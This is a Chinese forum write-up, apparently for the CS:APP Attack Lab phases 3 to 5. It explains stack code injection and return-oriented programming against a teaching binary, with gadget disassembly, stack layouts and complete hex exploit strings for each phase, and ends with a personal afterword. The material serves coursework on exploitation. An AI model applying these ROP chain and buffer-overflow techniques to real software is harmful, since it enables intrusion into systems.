
```
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55
```

由于我们的字符串应储存在`0x5561dca8`，而储存我们输入的首地址在`0x5561dc78`，所以我们应该给输入的最后一行填充0并在下一行处填入`cookie`字符串。

回想字符串如何储存：利用`ASCII`表示字符。

将`cookie`转换为`ASCII`码后为：35 39 62 39 39 37 66 61

至此，我们的`shellcode`就构建出来了：

```
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

创建文件`phase_3`并将`shellcode`存放在该的文件中，测试：

![](https://attach.52pojie.cn/forum/202505/28/180330alrryfm8f848ynvm.png)

6.png (114.03 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=Mjc3OTc3Mnw0YzAxOGNiN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc3Mnw0YzAxOGNiN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

## Return-Oriented Programming 概念补充

下个阶段不能使用前三个阶段的代码注入(`Code Injection`)技术，因为：

- 使用地址随机化技术，导致每次运行时栈的地址都不同，使得难以定位注入的代码。
- 将栈的内存设置为不可执行，所以就算可以将`PC`设置为注入代码的地址，程序也会返回`segmentation fault`。

故，下两阶段会用到`ROP`知识(`Return-Oriented Programming`)。

`ROP`使用的概念是找出程序中的特殊几个字节，即我们想要执行的代码与`ret`，我们称这种片段`gadget`(`ret`指令用来跳转到下一个`gadget`)。

![](https://attach.52pojie.cn/forum/202505/28/180333hrzbzxyybqb1b1tv.png)

7.png (69.81 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=Mjc3OTc3M3xiNjhiODVjYnwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc3M3xiNjhiODVjYnwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

上图说明了如何在栈中设置并执行一连串的`gadget`，其中`0xc3`表示指令`ret`。当每个`gadget`运行到`ret`时，会从栈顶取出下一个`gadget`的地址并执行，使得整个`gadget`链被完整执行。

用以下例子举例：

```
void setval_210 (unsigned *p) {
    *p = 3347663060U;
}
```

```
0000000000400f15 :
  400f15:       c7 07 d4 48 89 c7    movl  $0xc78948d4, (%rdi)
  400f1b:       c3                   retq
```

字节序列`48 89 c7`就可以组成指令`movq %rax, %rdi`，并且这个序列最后还跟随了一个`c3`，也就是`ret`。我们的目标序列在地址`0x400f18`处，所以如果直接跳转到`0x400f18`处就可以执行我们想要执行的指令。

## Phase_4

此题与`phase_2`雷同，只是开启了保护。因为无法在栈上执行代码，所以我们使用`ROP`。

在此我们想使用`gadget`实现以下功能：

```
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

但是显然`gadget`中不会包含我们需要的立即数(如：`0x59b997fa`)。换个思路，我们可以将数据存放在栈中，然后使用`popq`取得数值。搜寻`popq %rdi`对应的机器代码`5f`，发现无法在有效区内找到。我们换个思路，可以尝试用一个中转寄存器储存这个值：

```
gadget1: 
popq %rax
ret
gadget2: 
mov %rax, %rdi
ret
```

![](https://attach.52pojie.cn/forum/202505/28/180335icw9qvq1k4nx4buu.png)

8.png (108.26 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=Mjc3OTc3NHxkZTJmZDkzN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc3NHxkZTJmZDkzN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

查看上图可发现，对应机器代码为：`58 c3`与`48 89 c7 c3`。通过搜索我们可以找到以下两个函数：

```
00000000004019ca :
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq  
```

```
00000000004019a0 :
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq 
```

通过在`0x4019cc`截断第一个函数可以构成`gadget1`(`90`为`nop`，即`no operation`)，在`0x4019a2`截断第二个函数可以构成`gadget2`。

理想状态下，我们期望栈的状态如下：

```
---- Stack ----
-------------
full of zero | getbuf的栈帧
-------------
gadget1      | test的栈帧 (getbuf的返回地址)
cookie       |
gadget2      |
touch2       |
-------------
---------------
```

当`getbuf`执行`ret`后，会跳转到`gadget1`并将其地址出栈。

这时`gadget1`中的`pop`就会将`cookie`值从栈顶取出，然后跳转到`gadget2`继续执行。

故此，我们可以构建出以下`shellcode`，并保存在`phase_4`中：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

验证正确性：

![](https://attach.52pojie.cn/forum/202505/28/180337e9yeb3b1995pb8ny.png)

9.png (279.13 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=Mjc3OTc3NXwzYzZiOWI3MnwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc3NXwzYzZiOWI3MnwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

## Phase_5

终于到这个阶段了，可以先休息一波。官方文档还温馨提示我们：已经得到了95/100的分数，这是一个很棒的分数了。如果大家有甚么其他更重要的事情可以先放下这个`lab`去做啦！因为这个阶段只占可怜的5分，不值得我们耗费这么多时间去解答它，除非我们将它视为额外的挑战任务，想要超越这门课程对普通学生的期待程度。

既然如此，各位看官若是手头上有其他事情要做，就可以关闭这份题解啦！否则，我们还有路要走喔。

因为地址随机，所以想要获取字符串的储存地址应该使用`%rsp +`的形式取得。

我们想要实现以下功能：

```
mov %rsp, %rax
add $bias, %rax
mov %rax, %rdi
call touch3
```

但是寻找后发现没有`add`的机器码，我们可以使用另一个函数代替。

```
00000000004019d6 :
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3                      retq 
```

因为某些`mov`指令的源或目标寄存器的机器码不存在程序中，所以我们需要通过一些过渡寄存器来传递这些值。相信各位在经历`phase 4`后，已经可以独立寻找到相应的机器码地址。此处便不再重述，直接给出栈的样子 (省略各`gadget`的`ret`指令)。

```
---- Stack ----
--------------------------------------------
full of zero                                | getbuf的栈帧
--------------------------------------------   
mov %rsp, %rax: 0x401a06                    | test的栈帧 (getbuf的返回地址)
mov %rax, %rdi: 0x4019a2                    |
pop %rax: 0x4019cc                          |
bias: 8 * 9 = 72 (0x48)                     |
mov %eax, %edx: 0x4019dd                    |
mov %edx, %ecx: 0x401a70                    |
mov %ecx, %esi: 0x401a27                    |
lea (%rdi, %rsi, 1), %rax: 0x4019d6         |
mov %rax, %rdi: 0x4019a2                    |
Address of touch3: 0x4018fa                 |
ASCII of cookie: 35 39 62 39 39 37 66 61 00 |
--------------------------------------------
---------------
```

注意此处偏移量的计算：执行`mov %rsp, %rax`时，`%rsp`其实正指向存放`mov %rax, %rdi`的栈内存。回忆`ret`指令相等于以下两条指令`pop %rsp+ jmp %rsp`，所以执行第一个`gadget`时，`%rsp`正指向第二个`gadget`的内存地址。从第二个`gadget`算起，到`cookie`字符串储存的地址，中间隔了9个8字节的大小，所以偏移量为`$8 \times 9 = 72 (0x48)`。

以上，可以构建出`shellcode`：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

验证正确性：

![](https://attach.52pojie.cn/forum/202505/28/180340iyoyyqv24zhzhea5.png)

10.png (122.94 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=Mjc3OTc3NnxmODIyMDUzN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc3NnxmODIyMDUzN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

至此，五个阶段全部完结。

## 后记

终于完结此篇题解，时间拖得有些久，因为进入大学的准备忙得焦头烂额。最近才知道录取的是专业大类且没法依个人意愿自由分流，也就是说进入学校后还需二次分流，笔者很难依意愿进入喜爱的计算机了。正考虑继续就读本地大学或申请国外大学两条路，若选择继续就读本地大学，以后更新频率可能会创下新低，只能使用课余时间研究。等于回到高中时期，既要顾课业也要顾兴趣。最近也要为分流考试准备，预习数学与刷题，可能更新频率也不会太高。

最后，谢谢你愿意看我的后记碎碎念。
